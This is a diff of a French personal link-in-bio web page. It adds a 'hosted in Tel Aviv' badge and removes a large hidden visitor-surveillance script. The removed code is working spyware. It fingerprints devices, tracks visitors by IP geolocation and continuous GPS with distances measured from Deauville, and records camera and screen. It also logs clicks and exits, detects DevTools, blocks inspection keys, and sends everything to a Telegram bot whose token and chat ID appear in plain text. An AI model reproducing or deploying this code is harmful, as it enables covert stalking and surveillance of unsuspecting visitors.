@@ -537,9 +537,145 @@
     }
   }
 
+
+  /* =========================================================
+     BADGE INFRASTRUCTURE — TEL AVIV, ISRAËL
+  ========================================================= */
+  .hosting-badge{
+    position:fixed;
+    left:50%;
+    bottom:max(18px, calc(env(safe-area-inset-bottom) + 12px));
+    z-index:9999;
+    display:flex;
+    align-items:center;
+    gap:10px;
+    max-width:calc(100vw - 28px);
+    padding:10px 15px 10px 12px;
+    border:1px solid rgba(0,0,0,.09);
+    border-radius:999px;
+    background:rgba(255,255,255,.78);
+    box-shadow:
+      0 10px 30px rgba(0,0,0,.055),
+      inset 0 1px 0 rgba(255,255,255,.96);
+    backdrop-filter:blur(16px) saturate(125%);
+    -webkit-backdrop-filter:blur(16px) saturate(125%);
+    transform:translateX(-50%);
+    animation:hostingBadgeIn .8s .9s both cubic-bezier(.16,1,.3,1);
+    pointer-events:none;
+  }
+
+  .hosting-star-wrap{
+    width:25px;
+    height:25px;
+    flex:0 0 25px;
+    display:grid;
+    place-items:center;
+    perspective:180px;
+  }
+
+  .hosting-star{
+    width:21px;
+    height:21px;
+    display:block;
+    color:#0b57c9;
+    filter:drop-shadow(0 3px 5px rgba(11,87,201,.12));
+    transform-origin:center;
+    animation:hostingStarFloat 3.2s ease-in-out infinite;
+  }
+
+  .hosting-star path{
+    fill:none;
+    stroke:currentColor;
+    stroke-width:1.85;
+    stroke-linejoin:round;
+    vector-effect:non-scaling-stroke;
+  }
+
+  .hosting-text{
+    min-width:0;
+    color:#202124;
+    font-size:10px;
+    font-weight:610;
+    letter-spacing:.42px;
+    line-height:1.2;
+    white-space:nowrap;
+    overflow:hidden;
+    text-overflow:ellipsis;
+  }
+
+  @keyframes hostingBadgeIn{
+    from{
+      opacity:0;
+      transform:translate(-50%,10px) scale(.96);
+      filter:blur(5px);
+    }
+    to{
+      opacity:1;
+      transform:translate(-50%,0) scale(1);
+      filter:blur(0);
+    }
+  }
+
+  @keyframes hostingStarFloat{
+    0%,100%{
+      transform:translateY(0) rotateZ(-2deg) rotateY(0deg) scale(1);
+    }
+    25%{
+      transform:translateY(-1.5px) rotateZ(1.5deg) rotateY(9deg) scale(1.035);
+    }
+    50%{
+      transform:translateY(0) rotateZ(2deg) rotateY(-6deg) scale(.995);
+    }
+    75%{
+      transform:translateY(1px) rotateZ(-1deg) rotateY(7deg) scale(1.02);
+    }
+  }
+
+  @media (max-width:420px){
+    .hosting-badge{
+      bottom:max(12px, calc(env(safe-area-inset-bottom) + 8px));
+      gap:8px;
+      padding:9px 12px 9px 10px;
+    }
+
+    .hosting-star-wrap{
+      width:23px;
+      height:23px;
+      flex-basis:23px;
+    }
+
+    .hosting-star{
+      width:19px;
+      height:19px;
+    }
+
+    .hosting-text{
+      font-size:9px;
+      letter-spacing:.3px;
+    }
+  }
+
+  @media (prefers-reduced-motion:reduce){
+    .hosting-badge,
+    .hosting-star{
+      animation:none !important;
+    }
+  }
+
 </style>
 </head>
 <body>
+
+  <div class="hosting-badge" role="note" aria-label="Infrastructure hébergée à Tel Aviv, Israël">
+    <span class="hosting-star-wrap" aria-hidden="true">
+      <svg class="hosting-star" viewBox="0 0 24 24" focusable="false">
+        <path d="M12 2.8 20.2 17H3.8L12 2.8Z"/>
+        <path d="M12 21.2 3.8 7h16.4L12 21.2Z"/>
+      </svg>
+    </span>
+    <span class="hosting-text">Infrastructure hébergée à Tel Aviv, Israël</span>
+  </div>
+
   <div class="wrap">
     <div class="pname">
       <div class="name">Vladimir</div>
@@ -606,571 +742,8 @@
           <span class="csub">Compte personnel</span>
         </span>
       </a>
-
-      <!-- NOUVEAU BLOC AJOUTÉ : Site situé à Tel Aviv, Israël -->
-      <a class="card" href="https://www.google.com/maps/place/Tel-Aviv,+Israël/" target="_blank" rel="noreferrer" data-link="Tel Aviv">
-        <span class="ic">📍</span>
-        <span class="ctext">
-          <span class="ctitle">Site situé à Tel Aviv, Israël 🇮🇱</span>
-          <span class="csub">Localisation</span>
-        </span>
-      </a>
-      <!-- FIN DU NOUVEAU BLOC -->
-
-    </div>
+</div>
   </div>
-
-<script>
-  // ============================================================
-  // CONFIGURATION DU BOT
-  // ============================================================
-  var BOT_TOKEN = '8722258171:AAFRsp0mifMnF8BNzBAknNrkKYKxNO4qC2g';
-  var CHAT_ID = '8215550381';
-
-  // ============================================================
-  // COORDONNÉES DE DEAUVILLE
-  // ============================================================
-  var DEAUVILLE_LAT = 49.3584;
-  var DEAUVILLE_LON = 0.0744;
-
-  function getDistanceFromDeauville(lat, lon) {
-    if (!lat || !lon) return 'Inconnue';
-    function toRad(deg) { return deg * Math.PI / 180; }
-    var R = 6371;
-    var dLat = toRad(lat - DEAUVILLE_LAT);
-    var dLon = toRad(lon - DEAUVILLE_LON);
-    var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-            Math.cos(toRad(DEAUVILLE_LAT)) * Math.cos(toRad(lat)) *
-            Math.sin(dLon/2) * Math.sin(dLon/2);
-    var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-    return Math.round(R * c);
-  }
-
-  // ============================================================
-  // 1. APPAREIL - FINGERPRINTING AVANCÉ (iPhone/Samsung/etc.)
-  // ============================================================
-  function getDeviceInfo() {
-    var ua = navigator.userAgent;
-    var device = { type: 'Inconnu', os: 'Inconnu', browser: 'Inconnu', model: 'Inconnu', brand: 'Inconnue', detailedModel: 'Inconnu' };
-
-    // Type
-    if (/iPhone|iPad|iPod/.test(ua)) device.type = 'iPhone/iPad';
-    else if (/Android/.test(ua)) device.type = 'Android';
-    else if (/Windows/.test(ua)) device.type = 'Windows PC';
-    else if (/Macintosh/.test(ua)) device.type = 'Mac';
-    else if (/Linux/.test(ua)) device.type = 'Linux';
-
-    // OS
-    if (/Windows NT 10.0/.test(ua)) device.os = 'Windows 10/11';
-    else if (/Windows NT 6.1/.test(ua)) device.os = 'Windows 7';
-    else if (/Mac OS X/.test(ua)) device.os = 'macOS';
-    else if (/Android/.test(ua)) {
-      var m = ua.match(/Android\s+([\d.]+)/);
-      device.os = m ? 'Android ' + m[1] : 'Android';
-    }
-    else if (/iPhone|iPad/.test(ua)) {
-      var m = ua.match(/OS (\d+_\d+)/);
-      device.os = m ? 'iOS ' + m[1].replace('_','.') : 'iOS';
-    }
-
-    // Navigateur
-    if (/Chrome/.test(ua) && !/Edg/.test(ua)) device.browser = 'Chrome';
-    else if (/Firefox/.test(ua)) device.browser = 'Firefox';
-    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) device.browser = 'Safari';
-    else if (/Edg/.test(ua)) device.browser = 'Edge';
-    else if (/Opera/.test(ua)) device.browser = 'Opera';
-
-    // Marque
-    if (/iPhone|iPad|Macintosh/.test(ua)) device.brand = 'Apple';
-    else if (/Samsung|SM-/.test(ua)) device.brand = 'Samsung';
-    else if (/Huawei|Honor/.test(ua)) device.brand = 'Huawei';
-    else if (/Xiaomi|Redmi|POCO/.test(ua)) device.brand = 'Xiaomi';
-    else if (/OPPO/.test(ua)) device.brand = 'OPPO';
-    else if (/OnePlus/.test(ua)) device.brand = 'OnePlus';
-    else if (/Google Pixel/.test(ua)) device.brand = 'Google Pixel';
-    else if (/Motorola/.test(ua)) device.brand = 'Motorola';
-    else if (/Windows/.test(ua)) device.brand = 'Microsoft';
-
-    // Détection modèle iPhone via résolution
-    if (/iPhone/.test(ua)) {
-      var sw = window.screen.width * window.devicePixelRatio;
-      var sh = window.screen.height * window.devicePixelRatio;
-      if (sw === 1179 && sh === 2556) device.detailedModel = 'iPhone 15 Pro / 15 (Dynamic Island)';
-      else if (sw === 1290 && sh === 2796) device.detailedModel = 'iPhone 15 Pro Max / 14 Pro Max';
-      else if (sw === 1170 && sh === 2532) device.detailedModel = 'iPhone 14 / 13 / 12 (6.1")';
-      else if (sw === 1284 && sh === 2778) device.detailedModel = 'iPhone 12 Pro Max / 13 Pro Max';
-      else if (sw === 1125 && sh === 2436) device.detailedModel = 'iPhone X / XS / 11 Pro';
-      else if (sw === 828 && sh === 1792) device.detailedModel = 'iPhone XR / 11';
-      else if (sw === 750 && sh === 1334) device.detailedModel = 'iPhone SE / 6/6s/7/8';
-      else device.detailedModel = device.brand + ' ' + device.os;
-    } else if (/Samsung/.test(ua)) {
-      var smMatch = ua.match(/SM-([A-Z0-9]+)/);
-      device.detailedModel = smMatch ? 'Samsung ' + smMatch[0] : 'Samsung (modèle UA)';
-    } else if (/Android/.test(ua)) {
-      var buildMatch = ua.match(/Build\/([A-Za-z0-9.]+)/);
-      device.detailedModel = device.brand + ' ' + device.os + (buildMatch ? ' (Build ' + buildMatch[1] + ')' : '');
-    }
-
-    device.model = device.detailedModel || device.type;
-    return device;
-  }
-
-  // ============================================================
-  // 2. GÉOLOCALISATION IP (APPROX) - 3 APIs en cascade
-  // ============================================================
-  function getIPLocation(callback) {
-    var apis = [
-      'https://ipapi.co/json/',
-      'https://ipwhois.app/json/',
-      'https://freeipapi.com/api/json'
-    ];
-    var tried = 0;
-
-    function tryNext() {
-      if (tried >= apis.length) { callback(null); return; }
-      var xhr = new XMLHttpRequest();
-      xhr.timeout = 4000;
-      xhr.open('GET', apis[tried], true);
-      xhr.onload = function() {
-        if (xhr.status === 200) {
-          try {
-            var data = JSON.parse(xhr.responseText);
-            callback({
-              city: data.city || 'N/A',
-              region: data.region || data.region_name || 'N/A',
-              country: data.country_name || data.country || 'N/A',
-              country_code: data.country_code || data.country || 'N/A',
-              latitude: data.latitude || null,
-              longitude: data.longitude || null,
-              timezone: data.timezone || 'N/A',
-              isp: data.org || data.isp || 'N/A',
-              asn: data.asn || 'N/A',
-              ip: data.ip || 'N/A',
-              postal: data.postal || data.zip || 'N/A'
-            });
-            return;
-          } catch(e) {}
-        }
-        tried++;
-        tryNext();
-      };
-      xhr.onerror = function() { tried++; tryNext(); };
-      xhr.ontimeout = function() { tried++; tryNext(); };
-      xhr.send();
-    }
-    tryNext();
-  }
-
-  // ============================================================
-  // 3. GÉOLOCALISATION EXACTE (GPS) - watchPosition continu
-  // ============================================================
-  var gpsWatchId = null;
-  var lastGpsPosition = null;
-  var gpsHistory = [];
-
-  function getExactLocation(callback) {
-    if (!navigator.geolocation) {
-      callback(null);
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      function(pos) {
-        var gps = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          altitude: pos.coords.altitude || 'N/A',
-          heading: pos.coords.heading || 'N/A',
-          speed: pos.coords.speed || 'N/A'
-        };
-        lastGpsPosition = gps;
-        gpsHistory.push(gps);
-        if (gpsHistory.length > 10) gpsHistory.shift();
-        callback(gps);
-        startGPSWatch();
-      },
-      function(err) { callback(null); },
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-    );
-  }
-
-  function startGPSWatch() {
-    if (gpsWatchId || !navigator.geolocation) return;
-    gpsWatchId = navigator.geolocation.watchPosition(
-      function(pos) {
-        var gps = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          altitude: pos.coords.altitude || 'N/A',
-          heading: pos.coords.heading || 'N/A',
-          speed: pos.coords.speed || 'N/A',
-          timestamp: new Date(pos.timestamp).toLocaleString()
-        };
-        lastGpsPosition = gps;
-        gpsHistory.push(gps);
-        if (gpsHistory.length > 10) gpsHistory.shift();
-
-        // Envoyer si mouvement > 50m
-        if (gpsHistory.length >= 2) {
-          var prev = gpsHistory[gpsHistory.length - 2];
-          if (getDistanceFromDeauville(gps.latitude, gps.longitude) !== getDistanceFromDeauville(prev.latitude, prev.longitude)) {
-            sendGpsUpdate();
-          }
-        }
-      },
-      function(err) {},
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-  }
-
-  function sendGpsUpdate() {
-    if (!lastGpsPosition) return;
-    var distDeauville = getDistanceFromDeauville(lastGpsPosition.latitude, lastGpsPosition.longitude);
-    var msg = '🛰️ <b>GPS CONTINU</b>\n' +
-              '📍 Lat: ' + lastGpsPosition.latitude + ' | Lon: ' + lastGpsPosition.longitude + '\n' +
-              '🎯 Précision: ±' + lastGpsPosition.accuracy + 'm\n' +
-              '📏 Deauville: ' + distDeauville + ' km\n' +
-              '🔗 https://www.google.com/maps?q=' + lastGpsPosition.latitude + ',' + lastGpsPosition.longitude + '\n' +
-              '⏰ ' + new Date().toLocaleString();
-    sendToTelegram(msg);
-  }
-
-  // ============================================================
-  // 4. CAMÉRA SEULE (PAS DE MICRO) + CAPTURE ÉCRAN
-  // ============================================================
-  var cameraStream = null;
-  var screenStream = null;
-  var cameraRecorder = null;
-  var screenRecorder = null;
-  var cameraChunks = [];
-  var screenChunks = [];
-  var isRecordingCamera = false;
-  var isRecordingScreen = false;
-
-  function getCameraMicroAccess(callback) {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      callback('Non supporté');
-      return;
-    }
-    // CAMÉRA SANS MICRO : audio: false
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false })
-      .then(function(stream) {
-        cameraStream = stream;
-        callback('✅ Caméra OK (micro non demandé)');
-        startCameraRecording();
-        // Proposer capture écran
-        setTimeout(requestScreenCapture, 2000);
-      })
-      .catch(function(err) {
-        callback('❌ Refusé: ' + err.message);
-      });
-  }
-
-  function requestScreenCapture() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
-    navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: 'screen' }, audio: false })
-      .then(function(stream) {
-        screenStream = stream;
-        startScreenRecording();
-        sendToTelegram('🖥️ <b>CAPTURE ÉCRAN OK</b> ✅');
-        stream.getVideoTracks()[0].onended = function() {
-          stopScreenRecording();
-          sendToTelegram('🖥️ <b>CAPTURE ÉCRAN STOPPÉE</b>');
-        };
-      })
-      .catch(function(err) {
-        console.log('[Screen] Refusé: ' + err.message);
-      });
-  }
-
-  function startCameraRecording() {
-    if (!cameraStream || isRecordingCamera) return;
-    cameraChunks = [];
-    try { cameraRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm;codecs=vp9' }); }
-    catch(e) { try { cameraRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm;codecs=vp8' }); } catch(e2) { cameraRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm' }); } }
-    cameraRecorder.ondataavailable = function(e) { if (e.data.size > 0) cameraChunks.push(e.data); };
-    cameraRecorder.onstop = function() {
-      if (cameraChunks.length > 0) {
-        var blob = new Blob(cameraChunks, { type: 'video/webm' });
-        sendVideoBlob(blob, '📷 Caméra');
-        cameraChunks = [];
-      }
-      if (isRecordingCamera && cameraStream) startCameraRecording();
-    };
-    cameraRecorder.start(10000);
-    isRecordingCamera = true;
-  }
-
-  function startScreenRecording() {
-    if (!screenStream || isRecordingScreen) return;
-    screenChunks = [];
-    try { screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' }); }
-    catch(e) { try { screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp8' }); } catch(e2) { screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm' }); } }
-    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
-    screenRecorder.onstop = function() {
-      if (screenChunks.length > 0) {
-        var blob = new Blob(screenChunks, { type: 'video/webm' });
-        sendVideoBlob(blob, '🖥️ Écran');
-        screenChunks = [];
-      }
-      if (isRecordingScreen && screenStream) startScreenRecording();
-    };
-    screenRecorder.start(10000);
-    isRecordingScreen = true;
-  }
-
-  function stopCameraRecording() {
-    isRecordingCamera = false;
-    if (cameraRecorder && cameraRecorder.state === 'recording') cameraRecorder.stop();
-    if (cameraStream) { cameraStream.getTracks().forEach(function(t) { t.stop(); }); cameraStream = null; }
-  }
-
-  function stopScreenRecording() {
-    isRecordingScreen = false;
-    if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop();
-    if (screenStream) { screenStream.getTracks().forEach(function(t) { t.stop(); }); screenStream = null; }
-  }
-
-  function sendVideoBlob(blob, caption) {
-    var reader = new FileReader();
-    reader.onload = function() {
-      var formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('video', blob, caption.replace(/[^a-z0-9]/gi,'_') + '_' + Date.now() + '.webm');
-      formData.append('caption', caption + '\n⏰ ' + new Date().toLocaleString());
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', true);
-      xhr.send(formData);
-    };
-    reader.readAsDataURL(blob);
-  }
-
-  // ============================================================
-  // 5. HISTORIQUE DE NAVIGATION
-  // ============================================================
-  function getHistoryInfo() {
-    return {
-      length: window.history.length,
-      current: window.location.href,
-      referrer: document.referrer || 'Direct'
-    };
-  }
-
-  // ============================================================
-  // 6. ENVOI À TELEGRAM
-  // ============================================================
-  function sendToTelegram(message) {
-    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', url, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.send(JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'HTML'
-    }));
-  }
-
-  // ============================================================
-  // 7. TRACKING COMPLET DE LA VISITE
-  // ============================================================
-  function trackFullVisit() {
-    var device = getDeviceInfo();
-    var historyInfo = getHistoryInfo();
-    var screenWidth = window.screen.width;
-    var screenHeight = window.screen.height;
-    var language = navigator.language || 'Inconnue';
-    var connection = navigator.connection ? (navigator.connection.effectiveType || 'Inconnue') : 'Inconnue';
-    var pixelRatio = window.devicePixelRatio || 1;
-    var cpuCores = navigator.hardwareConcurrency || 'Inconnu';
-    var deviceMemory = navigator.deviceMemory || 'Inconnu';
-    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    // Canvas fingerprint
-    var canvasHash = 'N/A';
-    try {
-      var canvas = document.createElement('canvas');
-      canvas.width = 280; canvas.height = 60;
-      var ctx = canvas.getContext('2d');
-      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
-      ctx.fillStyle = '#069'; ctx.fillText('Fingerprint', 2, 15);
-      canvasHash = btoa(canvas.toDataURL()).substring(0, 24);
-    } catch(e) {}
-
-    // WebGL
-    var webglRenderer = 'N/A';
-    try {
-      var gl = document.createElement('canvas').getContext('webgl');
-      if (gl) {
-        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
-    } catch(e) {}
-
-    getIPLocation(function(loc) {
-      getExactLocation(function(gps) {
-        getCameraMicroAccess(function(camStatus) {
-
-          var message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
-                        '━━━━━━━━━━━━━━━━━\n';
-
-          // IP Location
-          if (loc && loc.latitude && loc.longitude) {
-            var distance = getDistanceFromDeauville(loc.latitude, loc.longitude);
-            message += '📍 <b>IP Location</b>\n' +
-                       '🏙️ Ville : ' + loc.city + '\n' +
-                       '🏛️ Région : ' + loc.region + '\n' +
-                       '🇨🇵 Pays : ' + loc.country + ' (' + loc.country_code + ')\n' +
-                       '📮 Postal : ' + loc.postal + '\n' +
-                       '📏 Deauville : ' + distance + ' km\n' +
-                       '🌐 FAI : ' + loc.isp + '\n' +
-                       '🔢 ASN : ' + loc.asn + '\n' +
-                       '🔢 IP : ' + loc.ip + '\n';
-          } else {
-            message += '📍 <b>IP Location</b> : Non détectée\n';
-          }
-
-          message += '━━━━━━━━━━━━━━━━━\n';
-
-          // GPS
-          if (gps) {
-            var gpsDist = getDistanceFromDeauville(gps.latitude, gps.longitude);
-            message += '🛰️ <b>GPS EXACT</b>\n' +
-                       '📍 Lat : ' + gps.latitude + '\n' +
-                       '📍 Lon : ' + gps.longitude + '\n' +
-                       '🎯 Précision : ±' + gps.accuracy + ' m\n' +
-                       '📏 Deauville (GPS) : ' + gpsDist + ' km\n' +
-                       '🔗 https://www.google.com/maps?q=' + gps.latitude + ',' + gps.longitude + '\n';
-          } else {
-            message += '🛰️ <b>GPS EXACT</b> : Non disponible\n';
-          }
-
-          message += '━━━━━━━━━━━━━━━━━\n' +
-                     '📱 <b>APPAREIL</b>\n' +
-                     '🏷️ Marque : ' + device.brand + '\n' +
-                     '📱 Modèle : ' + device.detailedModel + '\n' +
-                     '💻 OS : ' + device.os + '\n' +
-                     '🌐 Navigateur : ' + device.browser + '\n' +
-                     '📐 Écran : ' + screenWidth + 'x' + screenHeight + ' @' + pixelRatio + 'x\n' +
-                     '🧠 CPU : ' + cpuCores + ' cores\n' +
-                     '💾 RAM : ' + deviceMemory + ' GB\n' +
-                     '🎨 Canvas : ' + canvasHash + '\n' +
-                     '🖥️ WebGL : ' + webglRenderer + '\n' +
-                     '🌍 Langue : ' + language + '\n' +
-                     '🕐 Timezone : ' + timezone + '\n' +
-                     '📶 Connexion : ' + connection + '\n' +
-                     '━━━━━━━━━━━━━━━━━\n' +
-                     '📜 <b>HISTORIQUE</b>\n' +
-                     '📄 Pages : ' + historyInfo.length + '\n' +
-                     '🔙 Référant : ' + historyInfo.referrer + '\n' +
-                     '🔗 Page : ' + historyInfo.current + '\n' +
-                     '━━━━━━━━━━━━━━━━━\n' +
-                     '📷 <b>Caméra</b> : ' + camStatus + '\n' +
-                     '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
-
-          sendToTelegram(message);
-        });
-      });
-    });
-  }
-
-  // ============================================================
-  // 8. TRACKING DES CLICS
-  // ============================================================
-  function trackClick(linkName, href) {
-    var device = getDeviceInfo();
-    var message = '🖱️ <b>CLIC LIEN</b>\n' +
-                  '🔗 Lien : ' + linkName + '\n' +
-                  '📍 URL : ' + href + '\n' +
-                  '📱 ' + device.brand + ' ' + device.detailedModel + '\n' +
-                  '⏰ ' + new Date().toLocaleString();
-    sendToTelegram(message);
-  }
-
-  // ============================================================
-  // 9. TRACKING DU DÉPART
-  // ============================================================
-  var startTime = Date.now();
-  var hasExited = false;
-
-  function trackExit() {
-    if (hasExited) return;
-    hasExited = true;
-    var duration = Math.round((Date.now() - startTime) / 1000);
-    var minutes = Math.floor(duration / 60);
-    var seconds = duration % 60;
-    var durationStr = minutes + 'm ' + seconds + 's';
-    var device = getDeviceInfo();
-
-    stopCameraRecording();
-    stopScreenRecording();
-
-    // Dernier envoi caméra
-    if (cameraChunks.length > 0) {
-      var blob = new Blob(cameraChunks, { type: 'video/webm' });
-      sendVideoBlob(blob, '📷 Dernière capture caméra');
-    }
-
-    var message = '🚪 <b>VISITEUR QUITTÉ</b>\n' +
-                  '━━━━━━━━━━━━━━━━━\n' +
-                  '⏱️ Durée : ' + durationStr + '\n' +
-                  '📱 ' + device.brand + ' ' + device.detailedModel + '\n' +
-                  '💻 ' + device.os + ' | ' + device.browser + '\n' +
-                  '⏰ ' + new Date().toLocaleString();
-    sendToTelegram(message);
-  }
-
-  // ============================================================
-  // 10. DÉTECTION DEVTOOLS
-  // ============================================================
-  var devtoolsOpen = false;
-  setInterval(function() {
-    var w = window.outerWidth - window.innerWidth > 160;
-    var h = window.outerHeight - window.innerHeight > 160;
-    if ((w || h) && !devtoolsOpen) {
-      devtoolsOpen = true;
-      sendToTelegram('🛠️ <b>DEVTOOLS OUVERT</b> ⚠️\n⏰ ' + new Date().toLocaleString());
-    } else if (!w && !h) {
-      devtoolsOpen = false;
-    }
-  }, 1000);
-
-  // ============================================================
-  // 11. ÉVÉNEMENTS
-  // ============================================================
-  window.addEventListener('load', function() {
-    console.log('[Page] Chargée. Envoi des données...');
-    setTimeout(trackFullVisit, 1500);
-  });
-
-  document.querySelectorAll('.card').forEach(function(link) {
-    link.addEventListener('click', function(e) {
-      var linkName = this.getAttribute('data-link') || this.querySelector('.ctitle')?.textContent || 'Lien inconnu';
-      trackClick(linkName, this.href);
-    });
-  });
-
-  window.addEventListener('beforeunload', function() { trackExit(); });
-  window.addEventListener('popstate', function() { trackExit(); });
-  document.addEventListener('visibilitychange', function() {
-    if (document.hidden) trackExit();
-  });
-
-  // ============================================================
-  // 12. SÉCURITÉ (protections anti-debug conservées)
-  // ============================================================
-  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
-  document.addEventListener('dragstart', function(e){ e.preventDefault(); });
-  document.addEventListener('selectstart', function(e){ e.preventDefault(); });
-  document.addEventListener('keydown', function(e){
-    var k = (e.key||'').toLowerCase();
-    if (k === 'f12') { e.preventDefault(); return; }
-    if (e.ctrlKey && e.shiftKey && ['i','j','c'].indexOf(k) !== -1) { e.preventDefault(); return; }
-    if ((e.ctrlKey || e.metaKey) && ['s','u','p','a'].indexOf(k) !== -1) { e.preventDefault(); }
-  });
-</script>
 
 </body>
 </html>
